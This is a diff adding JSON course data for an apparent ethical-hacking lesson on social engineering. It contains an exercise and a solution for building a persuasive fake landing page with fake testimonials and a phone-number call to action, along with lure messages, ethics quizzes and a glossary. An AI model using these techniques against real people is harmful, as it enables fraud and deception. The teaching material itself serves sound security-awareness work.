+          "title": "Exercise: Make A Website for SE",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "d4b59e39-572c-402a-a0be-9e26bd21fb97",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": {
+            "files": [
+              {
+                "name": "website_template.zip",
+                "uri": "https://video.udacity-data.com/topher/2021/January/6008a13c_website-template/website-template.zip"
+              }
+            ],
+            "google_plus_link": null,
+            "career_resource_center_link": null,
+            "coaching_appointments_link": null,
+            "office_hours_link": null,
+            "aws_provisioning_link": null
+          },
+          "atoms": [
+            {
+              "id": 1089823,
+              "key": "b20d9561-729c-4f7d-9eff-bcd7e779a274",
+              "title": "Exercise: Make A Website for SE Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Creating  a Fake Website",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089824,
+              "key": "72000bd3-6ce2-4226-929f-4af3ac011a49",
+              "title": "Exercise: Make A Website for SE Instructions",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "Your organization wants to conduct a social engineering simulation exercise. Create a landing page to simulate a career advisory service by doing the following:\n\n1. Use keywords like *Promotion*, *Less Work*, *Lifestyle*, *Growth*, *Money*, *Car*, *House*, *Quick Results*.\n1. The call to action should be to make a phone call to +1 (987) 654 - 3210.\n1. Use images from <a href=\"https://pixabay.com/\" target=\"_blank\">pixabay.com</a>.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089825,
+              "key": "315c0591-d219-494a-971c-f1763980a541",
+              "title": "Quick Career Growth Webpage",
+              "semantic_type": "TaskListAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "315c0591-d219-494a-971c-f1763980a541",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "tasks": [
+                "Download and unzip the [base template](https://video.udacity-data.com/topher/2021/January/6008a13c_website-template/website-template.zip)",
+                "Customize the HTML code in the code editor",
+                "Add appropriate images",
+                "Start a local web server to host your web-page"
+              ],
+              "positive_feedback": "Awesome!\nYou can see my solution on the next page.",
+              "video_feedback": null,
+              "description": ""
+            }
+          ]
+        },
+        {
+          "id": 1089831,
+          "key": "57e24111-c43c-4a0f-8e82-5d4a8329a123",
+          "title": "Solution: Make A Website for SE",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "57e24111-c43c-4a0f-8e82-5d4a8329a123",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089827,
+              "key": "6c30787d-8ea5-48a4-b305-c83dee4db9fd",
+              "title": "Solution: Make A Website for SE Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## My Solution",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089828,
+              "key": "bd4da295-a2cd-4156-8fda-25d06238b919",
+              "title": "ND350 EHND C1 L4 A11 Solution Make A Website For SE V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "hmQLhdoHJyo",
+                "china_cdn_id": "hmQLhdoHJyo.mp4"
+              }
+            },
+            {
+              "id": 1129458,
+              "key": "69cc211b-d606-409d-acef-ab90e6332511",
+              "title": "Solution: Make A Website for SE Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Creating A Persuasive Landing Page\n\n### 1.  Update the Document Title\n\nA document title is not an element visible on the page but is visible on the browser tab itself. It is a good idea to customize this otherwise the page will say index.html.\n\n```html\n <title>Grow Your Career</title>\n```\n\n### 2.  Add a Bold Headline\n\nYou need a bold headline that attracts the audience you are targeting. In this example, the words \"Instant Promotion\" will attract the attention of people who want a promotion.\n\n```html\n<h1 style=\"color: white;\">How To Get An <u>INSTANT PROMOTION?</u></h1>4\n```\n\n### 3.  Write a Subheading Focused on the Benefit\n\nYour subheading should focus on a benefit or result. In this example, the possibility of a reduced workload is the benefit that the target will get if they continue to read the page.\n\n```html\n<h2 style=\"color: white;\">While Working <u>EVEN LESSER</u> Than You Do Right Now!</h2>\n```\n\n### 4. Include an Interesting  Video\n\nAttention spans are limited but a video can both hold the target's attention and build trust. In this example, I used a YouTube video where I explain the infosec career ladder.\n\n```html\nsrc=\"https://www.youtube.com/embed/pV1KqAfYFa0\"\n```\n\n### 5. Add Attractive  Images\n\nNot everyone will watch the video, but interesting images will help keep them reading the page. In this example, the base template has three placeholders in the images folder which I replaced with the following images.\n\n1. Car - <a href=\"https://pixabay.com/illustrations/car-vehicle-sports-car-racing-car-49278/House\" target=\"_blank\">https://pixabay.com/illustrations/car-vehicle-sports-car-racing-car-49278/</a>\n1. House - <a href=\"https://pixabay.com/illustrations/house-cottage-brick-brick-house-4826263/Money\" target=\"_blank\">https://pixabay.com/illustrations/house-cottage-brick-brick-house-4826263</a>\n1. Money - <a href=\"https://pixabay.com/illustrations/dollars-coins-money-currency-517113/TextIt\" target=\"_blank\">https://pixabay.com/illustrations/dollars-coins-money-currency-517113/</a>\n\n### 6. Write Persuasive Text\n\nKeep the text short and focused on the benefits. Use bullet points whenever possible. In this example, I included reasons:\n\n1. Discover a perfect strategy for your next promotion\n1. Understand what your next HR is looking for\n1. Talk through seven successful lifestyle changes\n1. Uncover the secrets of 10X growth formulae\n1. Get ready for the millionaire mindset\n1. It is absolutely free!!!\n\n### 7.  Include Testimonials for Social Proof\n\nSocial Proof helps the target to overcome any fear they have by showing what other people are saying. Good social proof can put a lot of pressure on the target to say \"yes\" to what the website is offering.  In my example, I used three fake testimonials:\n\n1. Talking to Sagar was totally awesome! I have much better clarity in my life, a big thanks!\n1. It's been a few months since I met Sagar, and I take pleasure in recommending this insane offer!\n1. An incredible ecosystem where I got what I wanted and we helped each other as well. Highly Recommended!\n\n### 8. End With a Call To Action\n\nBy the time the target gets to the bottom of the page, they should be fully convinced to take action. In this example, I used the `tel:` attribute in the anchor tag to open the dialer app on the target's phone when the button is clicked.  The phone number is preloaded, which increases the possibility of a successful attack.\n\n```html\n<a href=\"tel:+19876543210\"><button> GET YOUR FREE CONSULTATION NOW </button></a>\n```",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089830,
+              "key": "f9c42b60-fbc4-42f3-9874-7b9506fffe68",
+              "title": "Thinking Like an Ethical Hacker",
+              "semantic_type": "ValidatedQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "f9c42b60-fbc4-42f3-9874-7b9506fffe68",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Social Proof is an important element on any landing page but it is difficult to achieve.  If you use fake names and stock photos, the proof may not be convincing. But if you use real names and images, you may be violating the privacy of the people whose names and images you are using. <br><br> \nHow can you get around this dilemma?",
+                "matchers": [
+                  {
+                    "expression": "[^/s]+"
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        {
+          "id": 1089839,
+          "key": "76504095-ca3c-4e59-9109-924a1889e203",
+          "title": "Ethics of SE",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "76504095-ca3c-4e59-9109-924a1889e203",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089832,
+              "key": "bd0fe8f8-4318-4d03-a039-5bedb448e458",
+              "title": "Prioritizing SE Efforts Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Ethics of Social Engineering",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1124081,
+              "key": "ddc52df5-9e2b-4ad7-82bf-260aa18ef9ac",
+              "title": "",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "ddc52df5-9e2b-4ad7-82bf-260aa18ef9ac",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "An organization conducts a phishing simulation on December 23th with the following email: \n> Dear (employee name),    \n> We wanted to be your Christmas Santa on 25th but since the office is closed, let's get you a gift today itself... Surprise surprise... It's a bonus of $1000!  \n> Claim it by login into your account here (link to phishing page). ",
+                "answers": [
+                  {
+                    "id": "659909b7-8290-45f2-b467-0e44c5e6e578",
+                    "text": "Since attackers will use a similar message on Christmas, this email is a great opportunity to test employees",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "c0c6c3cb-e4c0-4a02-b950-9fca35639a03",
+                    "text": "This email should not be used in a phishing campaign",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1089834,
+              "key": "e3606863-2791-4e73-b7bb-23d5fc7880f3",
+              "title": "ND350 EHND C1 L4 A12 Ethics Of Social Engineering",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "a7ek3M7BDy0",
+                "china_cdn_id": "a7ek3M7BDy0.mp4"
+              }
+            },
+            {
+              "id": 1089835,
+              "key": "344bbe2f-41e7-4719-9879-a96c33812188",
+              "title": "Prioritizing SE Efforts Text",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## Social Engineering Involves Real People With Real Emotions\n\nBy design, many social engineering programs, like fake websites and phishing campaigns, are intentionally deceitful. This can be uncomfortable for the organization and the person who is running the social engineering program.\n\nHowever, if it is designed carefully, a social engineering program will stay within ethical boundaries to minimize any harm to the organization and its employees.\n\n### Rules of Ethical Social Engineering\n\n1. **Don't use messaging related to the target's personal life**. \nCreating an effective personal message is unnecessarily invasive and requires extra work. General messages or department-specific messages are easier to implement and can be just as effective.\n\n1. **Don't make promises to the target or raises false hopes.** \nMessages that make false promises can be extremely dangerous because the target may act on this information in ways that are completely unrelated to your task and can permanently harm the target. Instead of GREED, focus on the HELPFULNESS. It can often be just as motivating and doesn't require you to give the target any false hope.\n\n1. **Don't embarrass the target.** \nToo much pressure on the target can cause a lot of stress and anxiety and may lead to serious emotional and health issues. We know that fear can be very motivating, and it often takes just a little bit of fear to influence the target to do what you want them to do.\n\n### Effective and Ethical Social Engineering Messages\n\n* \"Your account has been locked\"\n* \"We need your personal email\"\n* \"The client needs credentials right now\"\n* \"Confirm your information in this PDF\"\n* \"There is troubling information in your performance report\"",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089836,
+              "key": "22bb1727-1375-475b-be63-9503c30a0465",
+              "title": "Prioritizing SE Efforts Knowledge Quiz",
+              "semantic_type": "CheckboxQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "22bb1727-1375-475b-be63-9503c30a0465",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Ethics are the most important element to be considered while doing a social engineering assessment because...",
+                "answers": [
+                  {
+                    "id": "rbk1",
+                    "text": "Social engineering involves people and they have emotions.",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "rbk2",
+                    "text": "Assessments with unethical messaging can affect employees performance.",
+                    "is_correct": true
+                  },
+                  {
+                    "id": "35069654-ea2f-4b44-95fa-7e32094327aa",
+                    "text": "Assessments with unethical messaging can lead to serious damage.",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1123114,
+              "key": "48968930-dddd-406a-85bb-78c41093a9d5",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### Further Reading\n\nA recent GoDaddy phishing campaign backfired because they did not follow best practices: <a href=\"https://www.cbsnews.com/news/godaddy-apologizes-insensitive-phishing-email-bonuses-employees/\" target=\"_blank\">CBS News: GoDaddy apologizes for \"insensitive\" phishing email offering bonuses to employees</a>.",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089854,
+          "key": "f2c5f58b-40f5-4a08-8281-76d5dbf1ee8c",
+          "title": "Lesson Recap",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "f2c5f58b-40f5-4a08-8281-76d5dbf1ee8c",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089849,
+              "key": "e2fe05a3-9be1-4d2f-b6e2-aa9c294203f8",
+              "title": "Lesson Recap Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## What We Have Learned",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089850,
+              "key": "2cef0286-18f5-4675-b476-40cdf7fdb60b",
+              "title": "ND350 EHND C1 L4 A13 Lesson Recap V3",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "PAJdRB5FBt8",
+                "china_cdn_id": "PAJdRB5FBt8.mp4"
+              }
+            },
+            {
+              "id": 1089851,
+              "key": "03b21f8c-8ca8-466e-84d8-9c329f59010f",
+              "title": "Lesson Recap Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this lesson, we studied Social Engineering and focused on five topics:\n\n### Five Opportunities In Human Psychology\n\nWe talked about how to take advantage of Greed, Fear, Urgency, Curiosity, and Helpfulness in your social engineering attacks.\n\n### Phishing\n\nWe learned how to conduct and manage a phishing simulation campaign on an enterprise-level using the GoPhish Framework.\n\n### Creating Malware\n\nWe created a malware file using metasploit which can be used in your social engineering attempts.\n\n### Landing Page For SE\n\nWe learned how to create a persuasive landing page to entice people to take actions that will help us gather information for our attempts to gain access.\n\n### Discussion On Ethics of SE\n\nWe ended this lesson with a discussion on ethics of social engineering. When is it okay to use these tactics and when is it not!",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1133385,
+              "key": "42fa7153-9faf-4e39-bed7-ad61b28e9dbd",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2021/February/60214833_l5-osint/l5-osint.jpg",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/42fa7153-9faf-4e39-bed7-ad61b28e9dbd",
+              "caption": "Up Next: Open Source Intelligence",
+              "alt": "Up Next: Open Source Intelligence",
+              "width": 878,
+              "height": 164,
+              "instructor_notes": null
+            },
+            {
+              "id": 1121933,
+              "key": "3bccdd96-6e79-47d2-944f-ce59b52f30b3",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## In The Next Lesson, We Will Focus On:\n\n* Exploratory Link Analysis\n* Data Mining\n* Establishing Links\n* Analyzing Links\n* Offensive OSINT",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089857,
+          "key": "ae6054a0-f819-413e-b9c1-bf66464c6f26",
+          "title": "Glossary",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "ae6054a0-f819-413e-b9c1-bf66464c6f26",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089855,
+              "key": "159bc9fb-e355-4db5-9191-3115a01aec14",
+              "title": "Glossary Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## New Terms In This Lesson",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1127836,
+              "key": "533f2691-6491-4642-bbb0-96775aaff402",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "| Term | Definition |\n|-|-|\n| Bind Connection | A connection where the attacker's machine connects to an open port on the target's machine | \n| Call to Action | An element that invites a user to do something like clicking on a button, making a call, or following a link | \n| Dumpster Diving | A social engineering technique where the attacker looks for potentially valuable information in the organization's trash cans or dumpsters | \n| Handler | The piece of code that an attacker uses to issue commands to the infected victim machine | \n| Landing Page | The web page where the target lands after clicking a link in a phishing simulation | \n| Page Template | A pre-formatted HTML page that can be used to create a  website quickly | \n| Payload | The malicious code that infects a target system | \n| Phishing | A social engineering attack where the attacker sends an email to the target to influence their actions to gain access or sensitive information | \n| Phishing Campaign | An organized security test using email to trick a user into revealing sensitive information. | \n| Phishing Simulation | A defensive exercise where the security analyst simulates a phishing attack in a controlled environment | \n| Reverse Connection | A connection where the target's machine connects back to an open port on the attacker's machine | \n| Sending Profile | A set of configurations that defines the identity of the email-sender in a phishing simulation, including name, email address, designation, and signature | \n| Simple Mail Transfer Protocol (SMTP) | A protocol used to send and receive email messages. Common authentication method includes using a username and password combination | \n| Social Proof | Social Proof is a marketing tactic where a person is influenced to take an action by observing others taking that action.  Examples include reviews, testimonials, and ratings | \n| Tailgaiting | A social engineering technique where the attacker closely follows a target to gain access to a restricted area. For example, when the target uses a key card to open a door, the attacker enters the room before the door closes. | \n| Vishing | A social engineering attack where the attacker calls the target to influence their actions to gain access or sensitive information | \n",
+              "instructor_notes": null
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "_deprecated": [
+    {
+      "name": "lesson_type",
+      "reason": "Obsolete"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    }
+  ]
+}
